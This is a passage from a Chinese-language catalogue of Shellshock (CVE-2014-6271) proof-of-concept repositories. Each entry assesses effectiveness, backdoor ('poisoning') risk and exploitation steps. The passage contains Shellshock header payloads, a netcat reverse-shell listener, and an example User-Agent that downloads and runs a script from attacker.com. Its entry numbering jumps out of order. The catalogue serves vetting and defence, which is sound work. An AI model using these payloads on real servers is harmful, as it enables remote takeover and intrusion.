在提供的 PoC 代码中，利用方式如下：

1.  攻击者设置一个 netcat 监听器 (`nc -nvlp 5050`)。
2.  攻击者使用 curl 命令向易受攻击的 Web 服务发送一个 HTTP 请求，其中 `User-Agent` 头包含一个恶意的 Bash 函数定义。这个函数定义包含执行反向 shell 的命令，将 shell 连接到攻击者的 netcat 监听器。
3.  当 Web 服务（通常通过 CGI 脚本）执行 Bash 时，Bash 会处理恶意的 `User-Agent` 头，执行反向 shell 命令，并允许攻击者访问受害容器上的 shell。

**项目地址:** [mochizuki875/CVE-2014-6271-Apache-Debian](https://github.com/mochizuki875/CVE-2014-6271-Apache-Debian)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #25

**来源**: [CVE-2014-6271-moften_CVE-2014-6271.md](../2014/CVE-2014-6271-moften_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock漏洞扫描器

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许攻击者执行任意命令

**影响版本:** <= 4.3

**利用条件:** 目标系统运行存在漏洞的Bash版本，并且存在CGI脚本或其他方式通过环境变量调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过特制的 Bash 环境变量执行任意命令。漏洞存在于 Bash 处理函数定义后尾随字符串的方式中。 

**有效性：**
提供的PoC代码是一个Python脚本，用于扫描目标URL是否存在Shellshock漏洞。它通过发送包含恶意payload的User-Agent头部的HTTP请求到常见的CGI脚本路径，然后检查响应中是否包含特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断目标是否易受攻击。根据漏洞库信息和搜索结果，该漏洞利用方式是有效的。

**投毒风险：**
该仓库包含一个Python脚本和一个README.md文件。Python脚本的功能是发送包含特定payload的HTTP请求并检查响应。README.md文件仅包含项目名称和描述。
 *  投毒代码分析: 该python脚本主要功能是发送特定Header的请求到服务器端CGI脚本,存在以下潜在的投毒风险：
    *  **CGI脚本路径猜测：**脚本中包含一个常见的CGI脚本路径列表。如果攻击者控制了该列表，可以通过添加恶意CGI路径来欺骗扫描者，引导他们攻击不存在的或伪造的服务。
    *  **Payload修改：**虽然当前的payload是良性的，用于检测漏洞，但攻击者可能修改payload以执行恶意操作，例如上传后门或执行拒绝服务攻击。
    *  **扫描行为：** 扫描行为本身可能被目标系统检测为恶意活动，从而触发防御机制或记录扫描者的IP地址。
    *  **误报风险：**脚本依赖于特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断漏洞是否存在。如果目标服务器返回包含该字符串的响应，即使实际不存在漏洞，脚本也会报告为易受攻击。修改这个字串可以导致信息泄露或者权限提升,因此可能存在一定风险。

**利用方式：**
1.  **环境变量注入：** 攻击者构造一个包含恶意代码的 Bash 函数定义的环境变量。例如：`(){ :;}; /usr/bin/id`。
2.  **触发 Bash 执行：** 通过 CGI 脚本、OpenSSH 的 ForceCommand 功能、DHCP 客户端脚本等方式，将构造的包含恶意代码的环境变量传递给 Bash。
3.  **代码执行：** 当 Bash 执行上述环境变量时，由于漏洞，尾随在函数定义后的命令会被执行，从而实现远程代码执行。

**总结：**
该PoC代码利用了Shellshock漏洞，通过环境变量注入执行任意命令。漏洞影响范围广泛，修复难度较大，危害程度高。


**项目地址:** [moften/CVE-2014-6271](https://github.com/moften/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #26

**来源**: [CVE-2014-6271-mritunjay-k_CVE-2014-6271.md](../2014/CVE-2014-6271-mritunjay-k_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名ShellShock，是GNU Bash中的一个严重漏洞。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被传递给Bash执行的进程时，会导致远程代码执行。 

**有效性：** 提供的POC代码是有效的。它通过设置`User-Agent`头来传递恶意payload。如果目标URL指向一个CGI脚本，且该脚本使用Bash处理环境变量，那么攻击者就可以执行任意命令。POC代码还包含一个检查机制，如果URL不包含`/cgi-bin/status`，它会提示用户是否要添加该路径，这增加了攻击的灵活性。

**投毒风险：** 在提供的`exploit.py`和`README.md`文件中，没有发现任何明显的投毒代码。代码逻辑清晰，目标是利用ShellShock漏洞执行命令。没有发现作者尝试引入恶意行为，例如上传恶意文件、植入后门或窃取凭据。因此，投毒风险评估为0%。

**利用方式：** 

1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统，该系统需要具有某种暴露点，该暴露点允许通过环境变量注入的方式利用Bash。常见的暴露点包括CGI脚本、OpenSSH的`ForceCommand`特性以及某些DHCP客户端。
2.  **构造Payload：** 构造一个包含恶意代码的环境变量。Payload的形式通常为`() { :; }; <command>`。其中`<command>`是要执行的shell命令。
3.  **传递Payload：** 将构造的Payload作为环境变量传递给Bash。对于CGI脚本，这可以通过设置HTTP头的`User-Agent`字段来实现，如提供的POC代码所示。在其他场景中，可能需要使用其他方法来设置环境变量。
4.  **执行命令：** 当Bash执行接收到包含Payload的CGI脚本时，它会解析环境变量，触发漏洞，并执行注入的命令。
5.  **验证执行结果:** POC脚本会打印出`page`的内容,命令执行的结果将会嵌入到返回的内容中.

**综上所述：** 提供的POC代码利用了ShellShock漏洞，通过构造恶意环境变量并在目标系统上触发执行，实现了远程命令执行。虽然漏洞利用风险很高，但提供的代码本身没有发现投毒风险。

**项目地址:** [mritunjay-k/CVE-2014-6271](https://github.com/mritunjay-k/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #27

**来源**: [CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md](../2014/CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且攻击者能够控制环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的严重漏洞。该漏洞源于Bash处理环境变量中函数定义之后存在的字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被Bash解析时，就能执行任意命令。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2014-6271是一个经过验证的漏洞，具有较高的利用成功率。

提供的Dockerfile和相关文件构成了一个可以利用该漏洞的环境。Dockerfile设置了一个基于Debian Wheezy的Apache服务器，并部署了一个CGI脚本（vulnerable），该脚本会调用Bash。攻击者可以通过设置恶意的环境变量，然后向CGI脚本发送HTTP请求来触发漏洞，从而在服务器上执行任意命令。

**投毒风险：**

分析提供的文件，存在一定的投毒风险，约为10%。Dockerfile中从/packages安装了预先存在的软件包。虽然COPY指令本身没有明显的恶意代码，但有需要审核的地方：
1. Dockerfile 从 `/packages` 目录安装软件包，而软件包的具体内容没有给出。如果这些包由攻击者控制，可能包含恶意后门。
2. `vulnerable` CGI 脚本的内容需要仔细审查，如果脚本本身存在后门，则存在投毒风险
3. main.sh 的内容也需要确认, 是否有安装一些额外的包.

**利用方式：**

1.  **CGI脚本利用：**  最常见的利用方式是通过CGI脚本。攻击者向Web服务器发送包含恶意环境变量的HTTP请求。如果Web服务器配置为使用Bash执行CGI脚本，Bash将解析这些环境变量，导致恶意代码执行。
2.  **OpenSSH ForceCommand：**  如果OpenSSH配置了ForceCommand选项，攻击者可以通过修改环境变量来执行任意命令。
3.  **DHCP客户端：**  某些DHCP客户端在执行脚本时会设置环境变量，攻击者可以通过控制DHCP服务器来注入恶意环境变量。

总之，CVE-2014-6271是一个高危漏洞，利用简单，影响广泛。需要及时修补受影响的系统。


**项目地址:** [opsxcq/exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #28

**来源**: [CVE-2014-6271-rsherstnev_CVE-2014-6271.md](../2014/CVE-2014-6271-rsherstnev_CVE-2014-6271.md)

## CVE-2014-6271 - ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程命令执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统运行Bash且存在可利用的入口点，例如CGI脚本、OpenSSH ForceCommand等。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的远程命令执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。漏洞利用的核心在于Bash在处理函数定义后附加的字符串时存在缺陷。 

**有效性评估：**
提供的Python POC代码利用了ShellShock漏洞，其有效性较高。代码首先通过发送包含特定字符串（`HelloKittyFromN0rdeN!`）的请求头来检测目标系统是否存在漏洞。如果检测到漏洞，则进入交互式shell，允许攻击者执行任意命令。

**利用方式分析：**
1.  **漏洞检测：** POC首先发送一个HTTP请求，其中User-Agent、Referer和Cookie头都包含恶意的Bash代码。这段代码的目的是在受影响的Bash版本中执行`echo HelloKittyFromN0rdeN!`命令，从而验证漏洞是否存在。
2.  **命令执行：** 如果漏洞存在，POC会进入一个循环，允许攻击者输入命令。输入的命令会被Base64编码，然后插入到HTTP请求头中。服务器端的Bash会解码并执行这些命令。
3.  **向量：** 此POC利用HTTP请求头（User-Agent, Referer, Cookie）作为攻击向量，这些头通常会被传递给服务器并可能被Bash处理。

**投毒风险分析：**
POC代码主要功能是检测和利用ShellShock漏洞。分析代码后，发现潜在的投毒风险较低（约1%）。

*   **Base64编码：** 使用Base64编码命令可能会被认为是一种混淆手段，但这是为了确保命令在HTTP头中传输的安全性，并非恶意隐藏代码。
*   **第三方库：** POC使用了requests库，理论上存在requests库被篡改的风险。但是，requests是常用的Python库，被篡改的可能性极低。
*   **BASE64_PATH变量:** 该变量用于指定`base64`命令的路径,如果该路径被修改为恶意程序,会存在投毒风险,但原代码中该变量默认为`/usr/bin/base64`,属于正常路径. 
*   **风险点：** 主要风险集中在使用未经授权的服务器上执行任意命令，这本身就是漏洞利用的目的，而不是POC代码引入的额外风险。

**搜索引擎结果印证：**
搜索结果确认了CVE-2014-6271是ShellShock漏洞，并且是广泛存在的，有多种利用方式。这些结果也强调了该漏洞的严重性和潜在影响。

综上所述，该POC代码的有效性较高，投毒风险较低，主要用于检测和利用ShellShock漏洞，允许攻击者通过HTTP请求头在目标系统上执行任意命令。

**项目地址:** [rsherstnev/CVE-2014-6271](https://github.com/rsherstnev/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---



---

## POC #12

**来源**: [CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md](../2014/CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过HTTP Header设置环境变量，且Bash版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式存在缺陷，攻击者可以通过构造包含恶意代码的环境变量，当Bash执行相关程序时，恶意代码会被执行，从而实现远程命令执行。从漏洞库信息和搜索引擎结果来看，此漏洞影响广泛，修复不彻底，危害巨大。

**有效性：**
提供的Python POC代码利用了ShellShock漏洞。它构造了一个包含恶意Bash代码的User-Agent头，并向目标URI发送GET请求。如果目标URI是一个CGI脚本，或者其他任何调用Bash并使用该User-Agent头作为环境变量的应用程序，那么恶意的Bash代码就会被执行，从而建立反向shell。

**投毒风险：**
该仓库的投毒风险较低。虽然任何代码都可能包含恶意成分，但此POC代码相对简单，主要功能是利用已知的ShellShock漏洞。潜在的风险可能包括：

*   作者可能在反向shell的Payload中植入其他恶意命令。但通过代码审计，反向shell的Payload清晰可见，未发现隐藏的恶意代码。
*   该代码可能针对特定系统环境做了优化，如果攻击者不了解这些优化，可能会导致利用失败，或留下攻击痕迹。但这种“优化”也可以被视作一种隐蔽的攻击尝试。

综合评估，该代码存在恶意投毒的可能性较低，约为5%。这个百分比代表一种潜在的风险，需要仔细审查代码才能完全消除。

**利用方式：**
1.  **确定目标：** 找到运行受影响Bash版本的服务器，并确认存在可以通过HTTP头设置环境变量的CGI脚本或其他应用。
2.  **准备攻击环境：** 在攻击者机器上设置NetCat监听指定端口，等待反向shell连接：`ncat -lkvnp <attacker-port>`。
3.  **构造Payload：** 使用POC脚本，指定目标IP地址、URI、攻击者IP地址和监听端口。
4.  **发送请求：** 运行POC脚本，它会构造一个包含恶意代码的HTTP GET请求，并将User-Agent设置为包含恶意代码的环境变量。
5.  **利用漏洞：** 如果目标存在漏洞，Bash会执行User-Agent头中的恶意代码，建立与攻击者机器的反向shell连接。
6.  **控制目标：** 攻击者通过反向shell控制目标系统，执行任意命令。

**项目地址:** [TheRealCiscoo/Shellshock-Exploit](https://github.com/TheRealCiscoo/Shellshock-Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #13

**来源**: [CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md](../2014/CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** 通过 4.3

**利用条件:** 目标系统使用Bash，且存在允许通过环境变量影响Bash执行的接口(例如CGI脚本)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的命令注入漏洞。该漏洞允许远程攻击者通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。利用方式通常涉及以下步骤：

1.  **确定目标系统是否易受攻击：** 检查目标系统是否正在运行易受攻击的Bash版本(通过 4.3).
2.  **寻找攻击入口点：** 寻找目标系统上允许通过环境变量影响Bash执行的接口，例如CGI脚本、OpenSSH的ForceCommand功能、DHCP客户端等。
3.  **构造恶意环境变量：** 构造包含恶意代码的函数定义的环境变量。例如：`() {{ :;}}; command`，其中`command`是要执行的命令。
4.  **发送包含恶意环境变量的请求：** 将构造的恶意环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
5.  **触发漏洞：** 目标系统在执行Bash时，会解析包含恶意代码的环境变量，从而执行攻击者指定的命令。

提供的POC代码`AutoShocker.py`是一个利用Shellshock漏洞的自动化脚本，具备以下功能：

*   **命令执行：** 允许攻击者在目标系统上执行任意命令，并将结果返回。
*   **反向Shell：** 允许攻击者在目标系统上建立反向Shell连接，从而获得对目标系统的完全控制权。

该漏洞利用的有效性取决于目标系统是否易受攻击，以及攻击者是否能够找到合适的攻击入口点。由于脚本需要用户输入目标IP和执行的命令/反向shell信息，因此投毒风险主要在于：

*   **误用风险：** 用户可能在未经授权的系统上使用该脚本，导致法律问题。
*   **脚本篡改：**  攻击者可能篡改脚本，添加恶意功能（例如植入后门、窃取用户凭据等），然后诱骗其他用户使用。

因此，我评估此仓库中存在作者隐藏的投毒代码的风险为10%。这主要是基于脚本本身的性质（漏洞利用工具）以及潜在的被篡改和滥用的可能性。

**项目地址:** [YunchoHang/CVE-2014-6271-SHELLSHOCK](https://github.com/YunchoHang/CVE-2014-6271-SHELLSHOCK)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #14

**来源**: [CVE-2014-6271-ajansha_shellshock.md](../2014/CVE-2014-6271-ajansha_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 通过 4.3

**利用条件:** 需要目标系统存在Bash环境并且存在可以设置环境变量的利用入口，例如：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以通过在环境变量中嵌入恶意代码，当Bash解析这些变量时，恶意代码会被执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2014-6271是一个真实存在且影响广泛的漏洞。提供的shelly.sh脚本是一个漏洞扫描器，用于检测目标系统是否存在Shellshock漏洞。由于它旨在 *检测* 而非 *利用* 漏洞，因此可以判断poc有效。

**投毒风险：**
分析提供的shelly.sh脚本，主要功能是检测目标系统是否存在Shellshock漏洞。脚本本身包含恶意代码的可能性较低，其主要通过发送包含特定payload的环境变量来触发漏洞，因此投毒的风险主要来自于脚本作者是否在检测Payload之外添加了额外的恶意逻辑。

尽管代码看起来比较直接，但仍然存在一定的低概率投毒风险，例如：
*   在漏洞检测逻辑之外，添加额外的命令执行代码，例如，扫描到存在漏洞后执行特定操作，上传信息等。
*   通过精心构造的payload，在检测漏洞的同时，悄悄地在目标系统上留下后门。

综合考虑代码量和功能，评估投毒风险为10%。

**利用方式：**
1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统。
2.  **寻找入口点：** 确定可以通过设置环境变量来与目标系统交互的入口点。常见的入口点包括：
    *   **HTTP CGI脚本：** 通过修改HTTP请求头中的User-Agent等字段，设置环境变量。
    *   **OpenSSH ForceCommand：**  通过SSH连接时设置环境变量。
    *   **DHCP客户端：** 某些DHCP客户端脚本在执行时会受到环境变量的影响。
3.  **构造Payload：** 构造包含恶意代码的环境变量。Payload的基本形式为`(){ :; }; command`，其中`command`是要执行的命令。
4.  **发送Payload：** 通过选择的入口点将构造的Payload发送给目标系统。
5.  **执行恶意代码：**  当目标系统中的Bash解析包含恶意代码的环境变量时，恶意代码将被执行，攻击者从而控制目标系统。

**项目地址:** [ajansha/shellshock](https://github.com/ajansha/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #15

**来源**: [CVE-2014-6271-akr3ch_CVE-2014-6271.md](../2014/CVE-2014-6271-akr3ch_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的恶意环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的 Bash 版本，且存在允许设置环境变量的途径，如 SSH ForceCommand, Apache mod_cgi/mod_cgid, DHCP 客户端等。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271 (Shellshock) 漏洞存在于 GNU Bash 中，攻击者可以通过在环境变量中嵌入恶意代码，利用 Bash 处理函数定义时存在的缺陷来执行任意命令。提供的 exploit.py 代码通过构造包含恶意命令的 User-Agent 头部，向目标 URL 发送 HTTP 请求，尝试利用 mod_cgi 或其他 CGI 脚本来触发漏洞。该漏洞影响广泛，可能导致服务器被完全控制。

**有效性：**
提供的 Python 脚本是有效的漏洞利用PoC，它通过构造恶意的 User-Agent 头部来触发 Shellshock 漏洞。

**投毒风险：**
该脚本的主要功能是利用 Shellshock 漏洞，没有发现任何明显的投毒代码，0%的可能性存在作者隐藏的投毒代码。

**利用方式：**
1.  确定目标系统运行着存在漏洞的 Bash 版本。
2.  找到一个可以设置环境变量的入口点（如 CGI 脚本）。
3.  使用提供的 Python 脚本或其他类似工具构造包含恶意代码的 HTTP 请求，并将该请求发送到目标 URL。
4.  如果漏洞存在且利用成功，恶意代码将在目标系统上执行。

**项目地址:** [akr3ch/CVE-2014-6271](https://github.com/akr3ch/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #16

**来源**: [CVE-2014-6271-anujbhan_shellshock-victim-host.md](../2014/CVE-2014-6271-anujbhan_shellshock-victim-host.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且通过CGI或其他方式允许环境变量注入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于 GNU Bash 中的严重漏洞。该漏洞允许攻击者通过特制的包含函数定义的字符串，在环境变量中注入并执行任意代码。

**有效性：**
提供的 Dockerfile 和相关 CGI 脚本构成了一个有效的 PoC 环境。Dockerfile 设置了一个基于 `vulhub/bash:4.3.0-with-httpd` 镜像的容器，该镜像包含一个易受攻击的 Bash 版本和一个 HTTP 服务器。`victim.cgi` 脚本旨在通过 CGI 执行 Bash 代码，但脚本本身的代码是无害的。漏洞利用的关键在于攻击者如何构造 HTTP 请求，将恶意代码注入到传递给 `victim.cgi` 脚本的环境变量中。如果服务器配置允许，则可以远程利用此漏洞执行任意命令。

**投毒风险：**
在提供的代码片段中，直接的代码投毒风险较低（约为 10%），主要原因是:
* `safe.cgi` 和 `victim.cgi` 文件中的 bash 代码非常简单，只输出“Hello world”，功能正常。没有发现任何恶意代码。  
*  Dockerfile指令中的 `RUN chmod +x /var/www/html/safe.cgi` 和 `RUN chmod +x /var/www/html/victim.cgi` 功能正常，没有发现任何恶意代码。

但是，需要注意以下几点潜在风险：
* **基础镜像风险：** PoC 依赖于 `vulhub/bash:4.3.0-with-httpd` 镜像。虽然该镜像旨在提供一个易受攻击的环境，但仍然需要确保该镜像本身没有被篡改或包含恶意代码。评估基础镜像的来源和可信度至关重要。
* **服务器配置风险：** 漏洞的利用依赖于 Web 服务器（如 Apache）如何处理 CGI 请求以及环境变量。如果服务器配置不当，可能会进一步加剧漏洞的风险。例如，某些配置可能允许攻击者覆盖更多的环境变量，从而扩大攻击面。
* **供应链攻击风险：** 攻击者可能通过污染开发者的环境或者代码仓库来插入恶意代码。

总体来说，直接代码投毒的风险较低，但基础镜像和服务器配置的安全性仍然需要谨慎评估。

**利用方式：**
1.  **目标环境：** 目标系统需要运行一个存在漏洞的 Bash 版本（<= 4.3）。
2.  **攻击入口：** 攻击通常通过 CGI 脚本或其他接受环境变量的 Web 应用入口进行。
3.  **注入恶意代码：** 攻击者构造一个包含恶意代码的环境变量。典型的 Shellshock payload 如下：`() { :; }; echo vulnerable`。这个 payload 利用了 Bash 在处理函数定义后剩余字符串的方式，`echo vulnerable` 会被执行。
4.  **触发漏洞：** 当 Bash 执行 CGI 脚本或处理包含恶意环境变量的请求时，漏洞被触发，攻击者注入的代码被执行。
5.  **远程代码执行：** 一旦漏洞被触发，攻击者就可以在目标系统上执行任意命令，例如获取敏感信息、修改系统配置或安装恶意软件。

**举例说明：**
攻击者可以构造一个 HTTP 请求头，例如 `User-Agent: () { :; }; /usr/bin/wget http://attacker.com/evil.sh -O /tmp/evil.sh; sh /tmp/evil.sh`。当 Web 服务器调用 Bash 处理该请求时，`wget` 命令会被执行，从 `attacker.com` 下载恶意脚本并在目标系统上执行。

**项目地址:** [anujbhan/shellshock-victim-host](https://github.com/anujbhan/shellshock-victim-host)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #17

**来源**: [CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md](../2014/CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md)

## CVE-2014-6271 - Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，且允许通过环境变量影响Bash执行，例如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。当Bash执行程序（例如，通过CGI脚本在Web服务器上）时，它会解析这些环境变量，从而导致代码注入。 

**有效性：**

根据提供的漏洞库信息、搜索结果和漏洞利用代码，该漏洞利用是有效的。漏洞库中明确指出该漏洞允许远程攻击者执行任意代码，搜索结果中也包含大量关于该漏洞的描述、利用案例和补丁信息。提供的Python POC代码也表明该漏洞可以被利用于获取目标系统的反向shell。

**投毒风险：**

分析提供的Python POC代码，风险较低。代码主要功能是构建带有恶意环境变量的HTTP请求，并发送到目标CGI脚本。代码中存在可以植入恶意代码的风险点在于payload的构建部分，但是目前的代码相对简单，仅用于执行反向shell。该仓库的 README 中有明确的测试目标和使用说明，相对比较安全。综上，认为此仓库存在10%的作者隐藏的投毒代码的可能性，该投毒代码可能为隐蔽的下载和执行其他恶意脚本。

**利用方式：**

1.  **确定目标：** 找到运行Bash且容易受到环境变量影响的应用程序或服务。常见的例子包括Web服务器上的CGI脚本。
2.  **构建Payload：** 构造一个包含恶意代码的环境变量。Payload通常包含一个函数定义，后跟要执行的命令。例如：`(){ :; }; echo vulnerable`
3.  **发送Payload：** 将构造的环境变量作为HTTP请求头或其他方式发送到目标应用程序。对于CGI脚本，可以通过User-Agent或其他HTTP头来传递。
4.  **执行代码：** 当目标应用程序调用Bash执行某些操作时，Bash会解析环境变量，从而执行注入的恶意代码。
5.  **反向Shell:** 本次提供的POC中,攻击者设置监听端口,通过漏洞利用,目标主机反弹shell给攻击者,达到控制目标主机的目的.

**风险缓解：**

*   升级Bash到已修复的版本。
*   限制对CGI脚本和其他易受攻击应用程序的访问。
*   验证和清理所有输入，特别是来自环境变量的输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [b4keSn4ke/CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #18

**来源**: [CVE-2014-6271-cved-sources_cve-2014-6271.md](../2014/CVE-2014-6271-cved-sources_cve-2014-6271.md)

## CVE-2014-6271-ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或使用OpenSSH的ForceCommand功能等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又称ShellShock，是一个存在于GNU Bash中的远程代码执行漏洞。漏洞源于Bash在处理环境变量中函数定义后的trailing strings的方式存在缺陷，允许攻击者通过构造恶意的环境变量来执行任意代码。

**1. 有效性：**

提供的Dockerfile构建了一个存在ShellShock漏洞的环境。`test.cgi`脚本被放置在`/usr/local/apache2/cgi-bin/`目录下，并且赋予了执行权限。该脚本会输出`/usr/bin/env`的内容，攻击者可以通过构造包含恶意代码的环境变量，并发送HTTP请求访问该CGI脚本，从而触发漏洞并执行恶意代码。因此提供的POC代码是有效的。

**2. 投毒风险：**

分析Dockerfile和相关文件：

*   Dockerfile：用于构建Docker镜像，升级Bash到4.3，并应用patch。
*   README.md：包含关于漏洞的信息以及镜像的来源。
*   `build/test.cgi`：一个简单的CGI脚本，用于触发漏洞。这个脚本本身不包含任何恶意代码,只是用于展示环境变量。

虽然大部分代码用于搭建漏洞测试环境，但仍存在潜在的投毒风险。Dockerfile中使用了`wget`从外部源下载bash源码和patch。尽管URL看起来是官方的GNU源，但如果这些源被劫持，则可能被替换为包含恶意代码的版本。此外，即使源代码没有被篡改，应用patch的过程也可能引入意料之外的问题。

综合来看，投毒风险较低，大约为10%。主要风险在于对外部源的依赖，以及patch应用过程中的潜在问题。

**3. 利用方式：**

ShellShock漏洞的利用方式如下：

1.  **攻击者构造包含恶意代码的环境变量。** 恶意代码被嵌入到函数定义之后，例如：`(){ :; }; command`。
2.  **攻击者通过某种方式将该环境变量传递给Bash。** 常见的场景包括：
    *   **CGI脚本：** 攻击者可以通过HTTP请求头设置环境变量，当Web服务器调用CGI脚本时，会将这些环境变量传递给Bash解释器。
    *   **OpenSSH的ForceCommand功能：** 攻击者可以通过SSH连接，利用ForceCommand功能执行命令，并将恶意环境变量传递给Bash。
    *   **DHCP客户端：** 在某些情况下，DHCP客户端会执行脚本，并将DHCP服务器提供的环境变量传递给Bash。
3.  **Bash执行包含恶意代码的环境变量。** 当Bash遇到函数定义后的trailing strings时，会将其作为命令执行，从而导致远程代码执行。

例如，通过CGI脚本利用该漏洞的Payload可能如下所示：

```
GET /cgi-bin/test.cgi HTTP/1.1
User-Agent: () { :; }; /usr/bin/env
Host: target.com
```

该请求会将`User-Agent`头设置为包含恶意代码的环境变量，当Web服务器调用`test.cgi`脚本时，`/usr/bin/env`命令会被执行。

**项目地址:** [cved-sources/cve-2014-6271](https://github.com/cved-sources/cve-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #19

**来源**: [CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md](../2014/CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

